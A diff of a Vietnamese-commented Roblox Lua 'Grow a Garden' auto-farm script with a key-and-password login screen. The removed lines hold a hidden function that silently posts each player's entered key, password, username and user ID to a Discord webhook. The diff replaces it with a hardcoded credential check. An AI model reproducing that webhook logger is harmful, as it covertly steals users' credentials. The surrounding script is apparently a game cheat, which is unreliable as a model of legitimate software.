@@ -1,6 +1,5 @@
 -- ========================================================
--- GROW A GARDEN AUTO FARM + KEY SYSTEM
--- Bản quyền thuộc về Bạn
+-- GROW A GARDEN AUTO FARM + KEY SYSTEM (OWNER ONLY)
 -- ========================================================
 
 local player = game:GetService("Players").LocalPlayer
@@ -9,10 +8,10 @@ local replicatedStorage = game:GetService("ReplicatedStorage")
 local workspace = game:GetService("Workspace")
 
 -- ===== CẤU HÌNH =====
-local WEBHOOK_URL = "https://discord.com/api/webhooks/ID_WEBHOOK/TOKEN_WEBHOOK" -- 👈 THAY LINK CỦA BẠN
+local KEY = "ABC123XYZ789"  -- 👈 THAY KEY CỦA BẠN VÀO ĐÂY
+local PASSWORD = "abc123xyz" -- 👈 THAY MẬT KHẨU CỦA BẠN VÀO ĐÂY
 
 local verified = false
-local keyData = nil
 
 -- ===== TẠO GUI XÁC THỰC =====
 local function createGUI()
@@ -22,8 +21,8 @@ local function createGUI()
     screenGui.Parent = player.PlayerGui
 
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 400, 0, 300)
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    mainFrame.Size = UDim2.new(0, 400, 0, 320)
+    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -160)
     mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
     mainFrame.BackgroundTransparency = 0.1
     mainFrame.BorderSizePixel = 0
@@ -35,6 +34,7 @@ local function createGUI()
     corner.CornerRadius = UDim.new(0, 12)
     corner.Parent = mainFrame
 
+    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 0)
@@ -46,6 +46,7 @@ local function createGUI()
     title.Font = Enum.Font.GothamBold
     title.Parent = mainFrame
 
+    -- Key
     local keyLabel = Instance.new("TextLabel")
     keyLabel.Size = UDim2.new(1, 0, 0, 25)
     keyLabel.Position = UDim2.new(0, 0, 0.2, 0)
@@ -72,6 +73,7 @@ local function createGUI()
     corner2.CornerRadius = UDim.new(0, 8)
     corner2.Parent = keyBox
 
+    -- Password
     local passLabel = Instance.new("TextLabel")
     passLabel.Size = UDim2.new(1, 0, 0, 25)
     passLabel.Position = UDim2.new(0, 0, 0.5, 0)
@@ -98,6 +100,7 @@ local function createGUI()
     corner3.CornerRadius = UDim.new(0, 8)
     corner3.Parent = passBox
 
+    -- Verify Button
     local verifyBtn = Instance.new("TextButton")
     verifyBtn.Size = UDim2.new(0.4, 0, 0, 40)
     verifyBtn.Position = UDim2.new(0.3, 0, 0.8, 0)
@@ -112,6 +115,7 @@ local function createGUI()
     corner4.CornerRadius = UDim.new(0, 8)
     corner4.Parent = verifyBtn
 
+    -- Status
     local statusLabel = Instance.new("TextLabel")
     statusLabel.Size = UDim2.new(1, 0, 0, 30)
     statusLabel.Position = UDim2.new(0, 0, 0.9, 0)
@@ -121,30 +125,6 @@ local function createGUI()
     statusLabel.TextSize = 13
     statusLabel.Font = Enum.Font.Gotham
     statusLabel.Parent = mainFrame
-
-    -- ===== HÀM GỬI WEBHOOK =====
-    local function sendToDiscord(key, password, username, userid)
-        local data = {
-            content = "",
-            embeds = {{
-                title = "🔑 KEY ĐÃ ĐƯỢC NHẬP!",
-                description = "Có người vừa nhập key",
-                color = 0x00FF00,
-                fields = {
-                    {name = "📌 Key", value = key, inline = true},
-                    {name = "🔒 Mật khẩu", value = password, inline = true},
-                    {name = "👤 Người dùng", value = username, inline = false},
-                    {name = "🆔 User ID", value = tostring(userid), inline = false},
-                    {name = "⏰ Thời gian", value = os.date("%H:%M %d/%m/%Y"), inline = false}
-                }
-            }}
-        }
-        
-        local encoded = httpService:JSONEncode(data)
-        pcall(function()
-            httpService:PostAsync(WEBHOOK_URL, encoded, Enum.HttpContentType.ApplicationJson)
-        end)
-    end
 
     -- ===== XỬ LÝ XÁC THỰC =====
     verifyBtn.MouseButton1Click:Connect(function()
@@ -157,15 +137,19 @@ local function createGUI()
             return
         end
         
-        sendToDiscord(key, password, player.Name, player.UserId)
-        
-        statusLabel.Text = "✅ XÁC THỰC THÀNH CÔNG!"
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        verified = true
-        
-        task.wait(1)
-        screenGui:Destroy()
-        startFarm()
+        -- Kiểm tra key (cứng)
+        if key == KEY and password == PASSWORD then
+            statusLabel.Text = "✅ XÁC THỰC THÀNH CÔNG!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            verified = true
+            
+            task.wait(1)
+            screenGui:Destroy()
+            startFarm()
+        else
+            statusLabel.Text = "❌ Sai key hoặc mật khẩu!"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        end
     end)
 end
 
@@ -312,6 +296,6 @@ local function startFarm()
 end
 
 -- ===== CHẠY SCRIPT =====
-print("🔐 GROW A GARDEN - KEY SYSTEM")
+print("🔐 KEY SYSTEM - OWNER ONLY")
 print("📌 Vui lòng nhập key để xác thực")
 createGUI()
